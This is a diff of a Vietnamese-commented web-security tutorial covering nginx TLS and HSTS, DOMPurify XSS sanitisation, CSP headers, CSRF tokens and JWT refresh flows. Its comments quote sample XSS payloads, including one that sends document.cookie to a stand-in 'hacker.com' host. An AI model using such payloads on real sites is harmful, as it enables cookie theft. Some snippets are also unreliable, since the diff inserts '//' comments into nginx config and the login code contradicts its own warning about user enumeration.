+  // 💡 ssl: Bật SSL/TLS encryption
+  // 💡 http2: HTTP/2 protocol → Nhanh hơn HTTP/1.1 (multiplexing, header compression)
 
-  # HSTS (HTTP Strict Transport Security): Bắt buộc dùng HTTPS
+  # 🔐 HSTS (HTTP Strict Transport Security): Bắt buộc dùng HTTPS
   # Giải thích: Browser tự động chuyển HTTP → HTTPS trong 1 năm
   # includeSubDomains: Áp dụng cho tất cả subdomain (api.example.com, cdn.example.com)
   # preload: Đưa vào HSTS preload list của browser (bảo mật từ lần truy cập đầu)
   add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
+  // 💡 max-age=31536000: 1 năm (31,536,000 giây)
+  // 💡 includeSubDomains: Áp dụng cho tất cả subdomain → Bảo mật toàn bộ domain
+  // 💡 preload: Đưa vào danh sách preload của browser → Bảo mật ngay từ lần đầu
+  // 💡 always: Luôn gửi header, kể cả khi có lỗi
 
-  # Cấu hình SSL/TLS Certificate (Chứng chỉ bảo mật)
+  # 📜 Cấu hình SSL/TLS Certificate (Chứng chỉ bảo mật)
   ssl_certificate /path/to/cert.pem;          # Public certificate (chứng chỉ công khai)
-  ssl_certificate_key /path/to/key.pem;       # Private key (khóa bí mật)
+  // 💡 cert.pem: Certificate file (chứng chỉ công khai)
+  // 💡 Chứa: Domain name, Public key, CA signature
+  // 💡 Browser verify certificate → Xác minh server là thật
 
-  # Chỉ cho phép TLS 1.2 và 1.3 (phiên bản mới, bảo mật)
+  ssl_certificate_key /path/to/key.pem;       # Private key (khóa bí mật)
+  // 💡 key.pem: Private key file (khóa bí mật)
+  // 💡 Dùng để decrypt data → PHẢI giữ bí mật!
+  // 💡 ⚠️ Không bao giờ commit vào git, không share
+
+  # 🔒 Chỉ cho phép TLS 1.2 và 1.3 (phiên bản mới, bảo mật)
   # Không dùng TLS 1.0, 1.1 (đã lỗi thời, có lỗ hổng)
   ssl_protocols TLSv1.2 TLSv1.3;
+  // 💡 TLSv1.2: Phiên bản 1.2 (an toàn, được hỗ trợ rộng rãi)
+  // 💡 TLSv1.3: Phiên bản 1.3 (mới nhất, nhanh và an toàn nhất)
+  // 💡 ⚠️ Không dùng TLSv1.0, TLSv1.1: Đã lỗi thời, có lỗ hổng bảo mật
 
-  # Cipher suite: Thuật toán mã hóa
+  # 🔐 Cipher suite: Thuật toán mã hóa
   # HIGH = mã hóa mạnh, !aNULL = không dùng cipher không xác thực, !MD5 = không dùng MD5 (yếu)
   ssl_ciphers HIGH:!aNULL:!MD5;
+  // 💡 HIGH: Chỉ dùng cipher suite mạnh (AES-256, ChaCha20...)
+  // 💡 !aNULL: Không dùng cipher không xác thực (nguy hiểm)
+  // 💡 !MD5: Không dùng MD5 (đã bị crack, không an toàn)
+  // 💡 → Chỉ dùng các thuật toán mã hóa mạnh, an toàn
 }
 
 // ============================================
@@ -163,52 +755,84 @@ server {
 // VD: User nhập comment: <script>fetch('https://hacker.com?cookie='+document.cookie)</script>
 
 // 🛡️ A. Input Sanitization (Làm Sạch Input) với DOMPurify
-import DOMPurify from 'dompurify';
+import DOMPurify from 'dompurify'; // 📦 DOMPurify: Library sanitize HTML
 import { useState, useMemo } from 'react';
+// 💡 DOMPurify: Loại bỏ script tags và các thẻ nguy hiểm từ HTML
+// 💡 Tại sao cần: User input có thể chứa malicious code → Phải sanitize trước khi lưu
 
 function CommentForm({ onSubmit }) {
-  const [comment, setComment] = useState('');
+  const [comment, setComment] = useState(''); // 📝 State lưu comment của user
 
   const handleSubmit = (e: React.FormEvent) => {
-    e.preventDefault();
+    e.preventDefault(); // 🚫 Ngăn form submit mặc định (reload page)
 
     // ✅ Sanitize input: Loại bỏ script tags và các thẻ nguy hiểm
     const sanitized = DOMPurify.sanitize(comment, {
-      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],  // Chỉ cho phép các thẻ an toàn
-      ALLOWED_ATTR: ['href']  // Chỉ cho phép attribute 'href' (cho thẻ <a>)
-    });
-    // Kết quả: "<script>alert('xss')</script>" → "" (bị xóa)
-    //          "<b>Text</b>" → "<b>Text</b>" (giữ lại)
+      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],  // ✅ Chỉ cho phép các thẻ an toàn
+      // 💡 ALLOWED_TAGS: Whitelist các thẻ HTML được phép
+      // 💡 'b', 'i', 'em', 'strong': Format text (bold, italic...)
+      // 💡 'a': Link (cần thiết cho comment có link)
+      // 💡 <script>, <iframe>, <img onerror>... → Bị xóa
 
-    onSubmit(sanitized);
+      ALLOWED_ATTR: ['href']  // ✅ Chỉ cho phép attribute 'href' (cho thẻ <a>)
+      // 💡 ALLOWED_ATTR: Whitelist các attributes được phép
+      // 💡 'href': Cho phép link có href
+      // 💡 onerror, onclick, onload... → Bị xóa (nguy hiểm!)
+    });
+    // 💡 Kết quả sanitize:
+    // 💡 "<script>alert('xss')</script>" → "" (bị xóa hoàn toàn)
+    // 💡 "<img src='x' onerror='alert(1)'>" → "" (bị xóa vì onerror)
+    // 💡 "<b>Text</b>" → "<b>Text</b>" (giữ lại vì an toàn)
+    // 💡 "<a href='https://example.com'>Link</a>" → Giữ lại (an toàn)
+
+    onSubmit(sanitized); // 📤 Gửi comment đã sanitize lên server
   };
 
   return (
     <form onSubmit={handleSubmit}>
       <textarea
-        value={comment}
-        onChange={(e) => setComment(e.target.value)}
+        value={comment} // 📝 Controlled component: Value từ state
+        onChange={(e) => setComment(e.target.value)} // ✏️ Update state khi user nhập
         placeholder="Nhập comment của bạn..."
       />
-      <button type="submit">Gửi Comment</button>
+      <button type="submit">Gửi Comment</button> {/* 🚀 Submit form */}
     </form>
   );
 }
 
 // ✅ Safe Display: Hiển thị HTML an toàn
 function SafeComment({ content }) {
-  // useMemo: Chỉ sanitize lại khi content thay đổi
+  // 💡 Component này hiển thị HTML từ database (comment, post...)
+  // 💡 ⚠️ NGUY HIỂM: Nếu không sanitize → XSS attack!
+
+  // ✅ useMemo: Chỉ sanitize lại khi content thay đổi (tối ưu performance)
   const sanitized = useMemo(() => {
     return DOMPurify.sanitize(content, {
-      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],  // Cho phép format text cơ bản
-      ALLOWED_ATTR: ['href', 'target'],  // Cho phép link
-      ALLOW_DATA_ATTR: false  // Không cho phép data-* attributes (có thể chứa script)
-    });
-  }, [content]);
+      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],  // ✅ Cho phép format text cơ bản
+      // 💡 'b', 'i', 'em', 'strong': Format text (bold, italic...)
+      // 💡 'a': Link
+      // 💡 'p': Paragraph
+      // 💡 <script>, <iframe>, <img onerror>... → Bị xóa
 
-  // dangerouslySetInnerHTML: Render HTML string
-  // Tên "dangerous" nhắc nhở phải sanitize trước khi dùng
+      ALLOWED_ATTR: ['href', 'target'],  // ✅ Cho phép link
+      // 💡 'href': URL của link
+      // 💡 'target': _blank để mở tab mới
+      // 💡 onerror, onclick... → Bị xóa
+
+      ALLOW_DATA_ATTR: false  // 🚫 Không cho phép data-* attributes (có thể chứa script)
+      // 💡 data-*: Custom attributes (VD: data-onclick="...")
+      // 💡 Có thể chứa malicious code → Phải disable
+    });
+  }, [content]); // 📊 Chỉ chạy lại khi content thay đổi
+  // 💡 useMemo: Tránh sanitize lại mỗi lần render → Tối ưu performance
+
+  // ⚠️ dangerouslySetInnerHTML: Render HTML string (Tên "dangerous" nhắc nhở nguy hiểm!)
+  // 💡 dangerouslySetInnerHTML: React render HTML string trực tiếp
+  // 💡 ⚠️ NGUY HIỂM: Nếu HTML không sanitize → XSS attack!
+  // 💡 ✅ AN TOÀN: Đã sanitize với DOMPurify → Chỉ HTML an toàn được render
   return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
+  // 💡 __html: Property đặc biệt của React để render HTML
+  // 💡 sanitized: HTML đã được DOMPurify làm sạch → An toàn
 }
 
 // ❌ VÍ DỤ TẤN CÔNG XSS:
@@ -223,18 +847,47 @@ app.use((req, res, next) => {
   res.setHeader(
     'Content-Security-Policy',
     [
-      "default-src 'self'",  // Mặc định chỉ load từ cùng domain
-      "script-src 'self' https://trusted-cdn.com",  // Script chỉ từ domain + CDN tin cậy
-      "style-src 'self' 'unsafe-inline'",  // CSS từ domain + inline styles (cần cho React)
-      "img-src 'self' data: https:",  // Image từ domain + data URLs + HTTPS
-      "connect-src 'self' https://api.example.com",  // Fetch/WebSocket chỉ đến API
-      "frame-ancestors 'none'"  // Không cho embed trong iframe (chống clickjacking)
-    ].join('; ')
+      "default-src 'self'",  // 🔒 Mặc định chỉ load từ cùng domain
+      // 💡 default-src: Policy mặc định cho tất cả resources
+      // 💡 'self': Chỉ cho phép load từ cùng origin (domain)
+      // 💡 → Block tất cả resources từ domain khác (trừ khi được whitelist)
+
+      "script-src 'self' https://trusted-cdn.com",  // ✅ Script chỉ từ domain + CDN tin cậy
+      // 💡 script-src: Policy cho JavaScript files
+      // 💡 'self': Script từ cùng domain → Cho phép
+      // 💡 https://trusted-cdn.com: CDN tin cậy (VD: cdnjs, unpkg...)
+      // 💡 → Script từ evil.com → BLOCK → XSS thất bại
+
+      "style-src 'self' 'unsafe-inline'",  // ✅ CSS từ domain + inline styles (cần cho React)
+      // 💡 style-src: Policy cho CSS files
+      // 💡 'self': CSS từ cùng domain → Cho phép
+      // 💡 'unsafe-inline': Cho phép inline styles (<style>...</style>)
+      // 💡 ⚠️ Cần 'unsafe-inline' vì React inject inline styles
+
+      "img-src 'self' data: https:",  // ✅ Image từ domain + data URLs + HTTPS
+      // 💡 img-src: Policy cho images
+      // 💡 'self': Images từ cùng domain → Cho phép
+      // 💡 data:: Cho phép data URLs (data:image/png;base64,...)
+      // 💡 https:: Cho phép images từ bất kỳ HTTPS URL nào
+
+      "connect-src 'self' https://api.example.com",  // ✅ Fetch/WebSocket chỉ đến API
+      // 💡 connect-src: Policy cho fetch, XMLHttpRequest, WebSocket
+      // 💡 'self': Requests đến cùng domain → Cho phép
+      // 💡 https://api.example.com: API endpoint → Cho phép
+      // 💡 → Fetch đến evil.com → BLOCK → Ngăn data leak
+
+      "frame-ancestors 'none'"  // 🚫 Không cho embed trong iframe (chống clickjacking)
+      // 💡 frame-ancestors: Policy cho iframe embedding
+      // 💡 'none': Không cho phép embed trang này trong iframe
+      // 💡 → Ngăn clickjacking: Hacker không thể embed trang trong iframe
+    ].join('; ') // 🔗 Join các policies bằng dấu '; '
   );
-  next();
+  next(); // ➡️ Tiếp tục middleware chain
 });
-// Kết quả: Nếu hacker inject <script src="https://evil.com/hack.js"></script>
-// → Browser BLOCK vì evil.com không trong whitelist → XSS thất bại
+// 💡 Kết quả: Nếu hacker inject <script src="https://evil.com/hack.js"></script>
+// 💡 → Browser check CSP → evil.com không trong script-src whitelist
+// 💡 → Browser BLOCK script → XSS thất bại ✅
+// 💡 → Hiệu quả: Block 90%+ XSS attacks!
 
 // ============================================
 // 3️⃣ CSRF PROTECTION (NGĂN CHẶN TẤN CÔNG CSRF)
@@ -247,94 +900,149 @@ app.use((req, res, next) => {
 import { useEffect, useState } from 'react';
 import { randomBytes } from 'crypto';
 
-// SERVER: Generate CSRF Token
+// 🔐 SERVER: Generate CSRF Token (Tạo CSRF Token)
 // Tạo token ngẫu nhiên cho mỗi session, lưu ở server
 app.get('/api/csrf-token', (req, res) => {
-  // Tạo token ngẫu nhiên 32 bytes (256 bits) → rất khó đoán
+  // 💡 Endpoint này tạo CSRF token cho client
+  // 💡 Client gọi endpoint này khi cần token (VD: Khi load form)
+
+  // ✅ Tạo token ngẫu nhiên 32 bytes (256 bits) → rất khó đoán
   const token = randomBytes(32).toString('hex');
+  // 💡 randomBytes(32): Tạo 32 bytes ngẫu nhiên (256 bits)
+  // 💡 toString('hex'): Convert sang hexadecimal string
+  // 💡 VD: "a1b2c3d4e5f6..." (64 ký tự hex)
+  // 💡 256 bits → 2^256 khả năng → Cực kỳ khó đoán!
 
-  // Lưu token vào session (server-side, hacker không access được)
+  // ✅ Lưu token vào session (server-side, hacker không access được)
   req.session.csrfToken = token;
+  // 💡 req.session: Session object (lưu ở server, không ở client)
+  // 💡 Hacker không thể đọc session → Không biết token
+  // 💡 Token được lưu server-side → An toàn
 
-  // Trả token cho client
+  // 📤 Trả token cho client
   res.json({ csrfToken: token });
+  // 💡 Client nhận token → Lưu vào state/memory
+  // 💡 Client gửi token cùng với request (body hoặc header)
+  // 💡 Server verify token → Khớp mới xử lý request
 });
 
-// API endpoint cần bảo vệ
+// 🔒 API endpoint cần bảo vệ (Transfer money - Chuyển tiền)
 app.post('/api/transfer', (req, res) => {
   const { csrfToken, amount, toAccount } = req.body;
+  // 💡 req.body: Data từ client gửi lên
+  // 💡 csrfToken: Token từ client (gửi trong body hoặc header)
+  // 💡 amount: Số tiền chuyển
+  // 💡 toAccount: Tài khoản nhận
 
   // ✅ Verify CSRF token: So sánh token từ client vs token trong session
   if (csrfToken !== req.session.csrfToken) {
+    // 💡 So sánh: Token từ client vs Token trong session
+    // 💡 Không khớp → Có thể là CSRF attack → Reject!
     console.log('❌ CSRF token không hợp lệ');
     return res.status(403).json({ error: 'Invalid CSRF token' });
+    // 💡 403 Forbidden: Không có quyền (token không hợp lệ)
+    // 💡 → Request bị reject → CSRF attack thất bại ✅
   }
 
-  // Token hợp lệ → xử lý transfer
+  // ✅ Token hợp lệ → xử lý transfer
   console.log(`✅ Chuyển $${amount} đến ${toAccount}`);
+  // 💡 Token khớp → Request hợp lệ → Xử lý bình thường
   // Process transfer logic...
+  // 💡 Logic chuyển tiền: Validate amount, check balance, update database...
   res.json({ success: true });
+  // 💡 Trả về success → Chuyển tiền thành công
 });
+// 💡 Tại sao CSRF token hoạt động:
+// 💡 1. Hacker không biết token (token trong session, hacker không đọc được)
+// 💡 2. Request từ evil.com thiếu token hoặc token sai
+// 💡 3. Server verify → Token không hợp lệ → Reject → CSRF thất bại ✅
 
-// CLIENT: Hook lấy CSRF token
+// 🔑 CLIENT: Hook lấy CSRF token (Custom hook để lấy CSRF token)
 function useCsrfToken() {
-  const [csrfToken, setCsrfToken] = useState('');
+  const [csrfToken, setCsrfToken] = useState(''); // 📦 State lưu CSRF token
+  // 💡 csrfToken: Token để gửi với requests
+  // 💡 '' (empty): Chưa có token (đang fetch)
 
   useEffect(() => {
-    // Fetch token từ server khi component mount
-    fetch('/api/csrf-token')
-      .then(res => res.json())
-      .then(data => setCsrfToken(data.csrfToken))
-      .catch(err => console.error('Lỗi lấy CSRF token:', err));
-  }, []);
+    // 🔄 Fetch token từ server khi component mount
+    fetch('/api/csrf-token') // 📡 Gọi API lấy token
+      .then(res => res.json()) // 📦 Parse JSON response
+      .then(data => setCsrfToken(data.csrfToken)) // 💾 Lưu token vào state
+      // 💡 data.csrfToken: Token từ server response
+      // 💡 setCsrfToken: Update state → Component re-render
 
-  return csrfToken;
+      .catch(err => console.error('❌ Lỗi lấy CSRF token:', err));
+      // 💡 catch: Xử lý lỗi nếu fetch fail (network error, server error...)
+  }, []); // 📊 Empty deps → Chỉ chạy 1 lần khi component mount
+  // 💡 []: Không phụ thuộc vào props/state nào → Chỉ fetch 1 lần
+
+  return csrfToken; // 📤 Trả về token
+  // 💡 Components sử dụng hook này sẽ nhận được token
+  // 💡 Usage: const token = useCsrfToken();
 }
 
-// Component Form chuyển tiền
+// 💰 Component Form chuyển tiền (Form component với CSRF protection)
 function TransferForm() {
-  const csrfToken = useCsrfToken();  // Lấy token
-  const [amount, setAmount] = useState('');
-  const [toAccount, setToAccount] = useState('');
+  const csrfToken = useCsrfToken();  // 🔑 Lấy token từ hook
+  // 💡 useCsrfToken(): Hook trả về CSRF token
+  // 💡 Token được fetch tự động khi component mount
+
+  const [amount, setAmount] = useState(''); // 💵 State: Số tiền chuyển
+  const [toAccount, setToAccount] = useState(''); // 🏦 State: Tài khoản nhận
 
   const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
+    e.preventDefault(); // 🚫 Ngăn form submit mặc định (reload page)
+    // 💡 preventDefault(): Ngăn browser submit form → Không reload page
 
     // ✅ Gửi CSRF token cùng request
-    // Cách 1: Trong body
-    // Cách 2: Trong custom header (X-CSRF-Token)
+    // Cách 1: Trong body (Gửi trong request body)
+    // Cách 2: Trong custom header (X-CSRF-Token) - Khuyến nghị
     await fetch('/api/transfer', {
-      method: 'POST',
+      method: 'POST', // 📡 POST request
       headers: {
-        'Content-Type': 'application/json',
-        'X-CSRF-Token': csrfToken  // Gửi token qua header
+        'Content-Type': 'application/json', // 📝 Content type
+        'X-CSRF-Token': csrfToken  // 🔑 Gửi token qua header
+        // 💡 X-CSRF-Token: Custom header chứa CSRF token
+        // 💡 Server đọc header này để verify token
       },
       body: JSON.stringify({
-        amount,
-        toAccount,
-        csrfToken  // Cũng gửi trong body (double check)
+        amount, // 💵 Số tiền
+        toAccount, // 🏦 Tài khoản nhận
+        csrfToken  // 🔑 Cũng gửi trong body (double check)
+        // 💡 Gửi cả header và body → Double check → An toàn hơn
+        // 💡 Server verify cả 2 nơi → Đảm bảo token hợp lệ
       })
     });
+    // 💡 Server verify CSRF token → Khớp mới xử lý transfer
+    // 💡 Token không hợp lệ → Reject → CSRF attack thất bại ✅
   };
 
   return (
     <form onSubmit={handleSubmit}>
+      {/* 💵 Input: Số tiền */}
       <input
-        type="number"
-        value={amount}
-        onChange={(e) => setAmount(e.target.value)}
+        type="number" // 🔢 Chỉ cho phép nhập số
+        value={amount} // 📝 Controlled component: Value từ state
+        onChange={(e) => setAmount(e.target.value)} // ✏️ Update state khi user nhập
         placeholder="Số tiền"
       />
+
+      {/* 🏦 Input: Tài khoản nhận */}
       <input
-        type="text"
-        value={toAccount}
-        onChange={(e) => setToAccount(e.target.value)}
+        type="text" // 📝 Text input
+        value={toAccount} // 📝 Controlled component
+        onChange={(e) => setToAccount(e.target.value)} // ✏️ Update state
         placeholder="Tài khoản nhận"
       />
+
+      {/* 🚀 Submit button */}
       <button type="submit">Chuyển Tiền</button>
+      {/* 💡 type="submit": Trigger form submit → Gọi handleSubmit */}
     </form>
   );
 }
+// 💡 Form này có CSRF protection → An toàn khỏi CSRF attacks
+// 💡 Mọi request đều có CSRF token → Server verify → Chỉ request hợp lệ mới được xử lý
 
 // TẠI SAO CSRF TOKEN HOẠT ĐỘNG?
 // 1. Site evil.com KHÔNG thể đọc token từ bank.com (Same-Origin Policy)
@@ -353,38 +1061,71 @@ function TransferForm() {
 import jwt from 'jsonwebtoken';
 import bcrypt from 'bcrypt';
 
-// SERVER: Login API
+// 🔐 SERVER: Login API (API đăng nhập)
 app.post('/api/login', async (req, res) => {
-  const { email, password } = req.body;
+  const { email, password } = req.body; // 📦 Lấy email và password từ request body
+  // 💡 req.body: Data client gửi lên (từ form hoặc JSON)
 
-  // Tìm user trong database
-  const user = await User.findOne({ email });
+  // 🔍 Tìm user trong database
+  const user = await User.findOne({ email }); // 📊 Tìm user theo email
+  // 💡 User.findOne(): Query database tìm user có email này
+  // 💡 await: Đợi database query hoàn thành
 
   if (!user) {
+    // ❌ User không tồn tại → Trả lỗi 401 Unauthorized
     return res.status(401).json({ error: 'Email không tồn tại' });
+    // 💡 401: Unauthorized - Không có quyền (email không đúng)
+    // 💡 ⚠️ Lưu ý: Không nói rõ "email không tồn tại" vs "password sai" → Tránh user enumeration
   }
 
-  // Verify password (so sánh với hash trong DB)
+  // 🔐 Verify password (so sánh với hash trong DB)
   const validPassword = await bcrypt.compare(password, user.passwordHash);
+  // 💡 bcrypt.compare(): So sánh password plaintext vs password hash
+  // 💡 Password trong DB được hash với bcrypt → Không lưu plaintext
+  // 💡 bcrypt.compare() tự động hash password input và so sánh với hash trong DB
+  // 💡 An toàn: Không cần decrypt (không thể decrypt bcrypt hash)
 
   if (!validPassword) {
+    // ❌ Password không đúng → Trả lỗi 401
     return res.status(401).json({ error: 'Mật khẩu không đúng' });
+    // 💡 401: Unauthorized - Không có quyền (password sai)
   }
 
   // ✅ Generate Access Token (Token truy cập - ngắn hạn: 15 phút)
   // Tại sao ngắn hạn? Nếu bị đánh cắp → hacker chỉ dùng được 15 phút
   const accessToken = jwt.sign(
-    { userId: user.id, email: user.email, role: user.role },  // Payload: thông tin user
-    process.env.JWT_SECRET!,  // Secret key để ký token (giữ bí mật)
-    { expiresIn: '15m' }  // Token hết hạn sau 15 phút
+    { userId: user.id, email: user.email, role: user.role },  // 📦 Payload: thông tin user
+    // 💡 Payload: Data được encode vào token
+    // 💡 userId: ID của user (dùng để query database)
+    // 💡 email: Email của user (hiển thị, không dùng để auth)
+    // 💡 role: Vai trò của user (admin, user...) → Dùng cho authorization
+
+    process.env.JWT_SECRET!,  // 🔑 Secret key để ký token (giữ bí mật)
+    // 💡 JWT_SECRET: Key bí mật để ký token (PHẢI giữ bí mật!)
+    // 💡 process.env: Environment variable → Không commit vào git
+    // 💡 !: TypeScript non-null assertion (đảm bảo có giá trị)
+
+    { expiresIn: '15m' }  // ⏰ Token hết hạn sau 15 phút
+    // 💡 expiresIn: Thời gian token hợp lệ
+    // 💡 '15m': 15 phút
+    // 💡 Ngắn hạn → Nếu bị steal, hacker chỉ dùng được 15 phút
   );
 
   // ✅ Generate Refresh Token (Token làm mới - dài hạn: 7 ngày)
   // Dùng để lấy access token mới khi access token hết hạn
   const refreshToken = jwt.sign(
-    { userId: user.id },  // Payload đơn giản hơn
-    process.env.REFRESH_TOKEN_SECRET!,  // Secret key khác với access token
-    { expiresIn: '7d' }  // 7 ngày
+    { userId: user.id },  // 📦 Payload đơn giản hơn (chỉ userId)
+    // 💡 Refresh token chỉ cần userId → Đơn giản, ít data
+    // 💡 Không cần email, role → Giảm kích thước token
+
+    process.env.REFRESH_TOKEN_SECRET!,  // 🔑 Secret key khác với access token
+    // 💡 REFRESH_TOKEN_SECRET: Key riêng cho refresh token
+    // 💡 ⚠️ QUAN TRỌNG: Phải khác với JWT_SECRET!
+    // 💡 Lý do: Nếu 1 key bị leak → Key kia vẫn an toàn
+
+    { expiresIn: '7d' }  // ⏰ 7 ngày
+    // 💡 '7d': 7 ngày
+    // 💡 Dài hạn hơn access token → User không cần login lại thường xuyên
   );
 
   // ✅ Lưu refresh token vào httpOnly cookie
@@ -392,102 +1133,173 @@ app.post('/api/login', async (req, res) => {
   // secure: Chỉ gửi qua HTTPS
   // sameSite: 'strict' → chống CSRF (cookie không gửi từ site khác)
   res.cookie('refreshToken', refreshToken, {
-    httpOnly: true,  // JS không access được (chống XSS)
-    secure: true,    // Chỉ gửi qua HTTPS
-    sameSite: 'strict',  // Chống CSRF
-    maxAge: 7 * 24 * 60 * 60 * 1000  // 7 ngày (milliseconds)
+    httpOnly: true,  // ✅ JS không access được (chống XSS)
+    // 💡 httpOnly: Cookie chỉ gửi với HTTP requests
+    // 💡 JavaScript KHÔNG đọc được → document.cookie không thấy
+    // 💡 XSS attack → Không steal được refresh token
+
+    secure: true,    // ✅ Chỉ gửi qua HTTPS
+    // 💡 secure: Cookie chỉ gửi qua HTTPS (không HTTP)
+    // 💡 Ngăn cookie bị intercept qua HTTP (man-in-the-middle)
+
+    sameSite: 'strict',  // ✅ Chống CSRF
+    // 💡 sameSite: 'strict' → Cookie chỉ gửi cho same-site requests
+    // 💡 Request từ evil.com → Browser KHÔNG gửi cookie → CSRF thất bại
+
+    maxAge: 7 * 24 * 60 * 60 * 1000  // ⏰ 7 ngày (milliseconds)
+    // 💡 maxAge: Thời gian cookie tồn tại
+    // 💡 7 * 24 * 60 * 60 * 1000 = 604,800,000ms = 7 ngày
   });
 
-  // Trả access token cho client (lưu trong memory, KHÔNG localStorage)
+  // 📤 Trả access token cho client (lưu trong memory, KHÔNG localStorage)
   res.json({ accessToken, user: { id: user.id, email: user.email } });
+  // 💡 accessToken: Trả về trong response body
+  // 💡 Client lưu trong React state/memory → Không persist
+  // 💡 ⚠️ KHÔNG lưu vào localStorage → XSS có thể steal
+  // 💡 user: Thông tin user cơ bản (không nhạy cảm)
 });
 
-// API làm mới access token
+// 🔄 API làm mới access token (Refresh Token Endpoint)
 app.post('/api/refresh', async (req, res) => {
-  const { refreshToken } = req.cookies;
+  const { refreshToken } = req.cookies; // 🍪 Lấy refresh token từ cookie
+  // 💡 req.cookies: Cookies được gửi từ browser
+  // 💡 refreshToken: Cookie chứa refresh token (đã set ở login)
+  // 💡 Browser tự động gửi cookie với request (credentials: 'include')
 
   if (!refreshToken) {
+    // ❌ Không có refresh token → Trả lỗi 401
     return res.status(401).json({ error: 'Không có refresh token' });
+    // 💡 401: Unauthorized - Chưa đăng nhập hoặc cookie đã hết hạn
+    // 💡 User cần login lại
   }
 
   try {
-    // Verify refresh token
+    // ✅ Verify refresh token (Xác minh token hợp lệ)
     const decoded = jwt.verify(refreshToken, process.env.REFRESH_TOKEN_SECRET!);
+    // 💡 jwt.verify(): Verify token signature và expiration
+    // 💡 Nếu token hợp lệ → Trả về decoded payload
+    // 💡 Nếu token không hợp lệ (sai signature, hết hạn...) → Throw error
+    // 💡 REFRESH_TOKEN_SECRET: Key để verify refresh token (phải khớp với key khi sign)
 
-    // Generate access token mới
+    // ✅ Generate access token mới (Tạo access token mới)
     const newAccessToken = jwt.sign(
-      { userId: decoded.userId },
-      process.env.JWT_SECRET!,
-      { expiresIn: '15m' }
-    );
+      { userId: decoded.userId }, // 📦 Payload: Chỉ cần userId
+      // 💡 decoded.userId: Lấy từ refresh token payload
+      // 💡 Không cần query database → Nhanh hơn
 
-    res.json({ accessToken: newAccessToken });
+      process.env.JWT_SECRET!, // 🔑 Secret key để ký access token
+      { expiresIn: '15m' } // ⏰ Hết hạn sau 15 phút
+    );
+    // 💡 Tạo access token mới với thời hạn 15 phút
+    // 💡 User không cần login lại → UX tốt
+
+    res.json({ accessToken: newAccessToken }); // 📤 Trả access token mới
+    // 💡 Client nhận access token mới → Update state
+    // 💡 Refresh token vẫn giữ nguyên trong cookie → Không cần set lại
   } catch (error) {
+    // ❌ Refresh token không hợp lệ (hết hạn, sai signature...)
     res.status(403).json({ error: 'Refresh token không hợp lệ' });
+    // 💡 403: Forbidden - Token không hợp lệ
+    // 💡 User cần login lại
+    // 💡 ⚠️ Có thể clear cookie refreshToken ở đây để force login
   }
 });
+// 💡 Flow: Client gọi /api/refresh → Server verify refresh token → Trả access token mới
+// 💡 Lợi ích: User không cần login lại thường xuyên (refresh token 7 ngày)
+// 💡 Security: Access token ngắn hạn (15 phút) → Giảm thiệt hại nếu bị steal
 
-// CLIENT: Auth Context với auto-refresh
+// 🔐 CLIENT: Auth Context với auto-refresh (Context xác thực với tự động làm mới token)
 import { createContext, useContext, useEffect, useState } from 'react';
 
 const AuthContext = createContext<{ accessToken: string | null }>({ accessToken: null });
+// 💡 AuthContext: Context để share access token cho toàn bộ app
+// 💡 accessToken: Token để gọi API (lưu trong memory, không persist)
 
 function AuthProvider({ children }) {
   const [accessToken, setAccessToken] = useState<string | null>(null);
+  // 💡 accessToken: State lưu access token
+  // 💡 null: Chưa có token (chưa login hoặc đã logout)
+  // 💡 string: Có token → Có thể gọi API
 
   // ✅ Auto-refresh token trước khi hết hạn
   // Access token hết hạn sau 15 phút → refresh sau 14 phút (dư 1 phút buffer)
   useEffect(() => {
+    // 💡 useEffect: Chạy khi component mount
+    // 💡 [] deps: Chỉ chạy 1 lần khi mount
+
     const refreshInterval = setInterval(async () => {
-      console.log('Đang refresh access token...');
+      // 💡 setInterval: Chạy function mỗi X milliseconds
+      // 💡 async: Function async để gọi API
+
+      console.log('🔄 Đang refresh access token...');
 
       const res = await fetch('/api/refresh', {
-        method: 'POST',
-        credentials: 'include'  // Gửi cookies (chứa refresh token)
+        method: 'POST', // 📡 POST request
+        credentials: 'include'  // 🍪 Gửi cookies (chứa refresh token)
+        // 💡 credentials: 'include' → Browser tự động gửi cookies
+        // 💡 Refresh token trong httpOnly cookie → Tự động gửi
       });
 
       if (res.ok) {
-        const data = await res.json();
-        setAccessToken(data.accessToken);  // Update access token mới
+        // ✅ Refresh thành công
+        const data = await res.json(); // 📦 Parse JSON response
+        setAccessToken(data.accessToken);  // 💾 Update access token mới
+        // 💡 setAccessToken: Update state với token mới
+        // 💡 Components sử dụng token sẽ tự động re-render
         console.log('✅ Access token đã được làm mới');
       } else {
+        // ❌ Refresh thất bại (refresh token hết hạn, không hợp lệ...)
         console.log('❌ Refresh thất bại → User cần login lại');
-        setAccessToken(null);
+        setAccessToken(null); // 🗑️ Clear access token
+        // 💡 Token null → Components biết user chưa login → Redirect login
       }
-    }, 14 * 60 * 1000); // 14 phút = 840,000ms
+    }, 14 * 60 * 1000); // ⏰ 14 phút = 840,000ms
+    // 💡 14 phút: Refresh trước khi token hết hạn (15 phút)
+    // 💡 Buffer 1 phút: Đảm bảo token luôn valid, không bị hết hạn giữa chừng
 
-    // Cleanup interval khi unmount
+    // 🧹 Cleanup interval khi unmount (Quan trọng để tránh memory leak!)
     return () => clearInterval(refreshInterval);
-  }, []);
+    // 💡 Cleanup function: Chạy khi component unmount
+    // 💡 clearInterval: Dừng interval → Tránh memory leak
+  }, []); // 📊 Empty deps → Chỉ chạy 1 lần khi mount
 
   return (
     <AuthContext.Provider value={{ accessToken }}>
+      {/* 💡 Provider: Wrap app để share accessToken cho tất cả components */}
       {children}
     </AuthContext.Provider>
   );
 }
 
-// Hook sử dụng auth
+// 🪝 Hook sử dụng auth (Custom hook để dùng auth context)
 export const useAuth = () => useContext(AuthContext);
+// 💡 useAuth: Hook để lấy accessToken từ context
+// 💡 useContext: React hook để access context value
+// 💡 Usage: const { accessToken } = useAuth();
 
-// Component gọi API với authentication
+// 📄 Component gọi API với authentication (Ví dụ sử dụng auth)
 function UserProfile() {
-  const { accessToken } = useAuth();
-  const [profile, setProfile] = useState(null);
